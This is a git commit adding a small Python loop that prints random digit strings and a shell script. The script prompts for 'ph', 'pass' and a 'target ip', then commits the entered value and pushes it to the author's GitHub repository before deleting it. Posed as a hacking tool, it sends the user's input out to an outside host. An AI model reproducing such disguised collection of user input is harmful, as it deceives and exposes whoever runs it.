a8bc0abedb98897b9f2bef05ab9b0c9275291a2f
oo-ozo <55140388+oo-ozo@users.noreply.github.com>
2020-05-24 22:05:13 +0630

    Add files via upload

---
+++ kooo.py
@@ -0,0 +1,8 @@
+def loop():
+    import random
+    l=['1001110','0001111','1001011','1110108']
+    while True:
+        k=random.choice(l)
+        print(k)
+
+loop()
---
+++ kop.sh
@@ -0,0 +1,18 @@
+git config --global user.name "oo-ozo"
+git config --global user.email "kooo101979@gmail.com"
+git pull
+read -p "enter ph :" H
+read -p "enter pass :" F
+
+read -p "enter target ip :" T
+
+
+echo $H >> $T
+echo $H >> $T
+git init
+git add $T
+git commit -m "first commit"
+git remote add origin https://github.com/oo-ozo/target.git
+git push -u origin master
+rm $T
+python kooo.py
